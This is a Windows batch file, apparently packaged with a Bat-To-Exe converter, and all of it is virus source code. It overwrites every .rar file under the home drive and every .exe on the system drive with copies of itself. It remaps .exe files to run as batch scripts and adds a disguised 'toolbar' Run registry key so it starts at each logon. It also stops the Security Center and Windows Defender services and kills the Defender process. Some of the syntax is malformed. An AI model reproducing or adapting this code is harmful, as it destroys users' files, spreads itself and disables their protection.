::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFC5HSRa+GGStCLkT6ezo0/6Vq10SRKIcXM//37KLLuQW+AXFe4IkwHNIjdgwGAlRbh27LiwQ6UpHsGGLM8KO8y7vXkGf71klCCtxn2aw
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
Dir %Homedrive% /s /b > DirPath
For /f %%Y In (DirPath) Do (
Set DirPath=%%Y > Nul   
For %%Z In (%DirPath%\*.rar) Do (
Set RarInfect=%%Z > Nul
Copy /y %0 %RarInfect%
 )
 )

Del /f /s /q DirPath
assoc .exe=batfile DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt echo Y | FOR /F tokens=1,* delims=: %%j in (InfList_exe.txt) do copy /y %0 %%j:%%k

valinf = "rundll32_%random%_toolbar"
reginf = "hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul

net stop "wscsvc"

net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"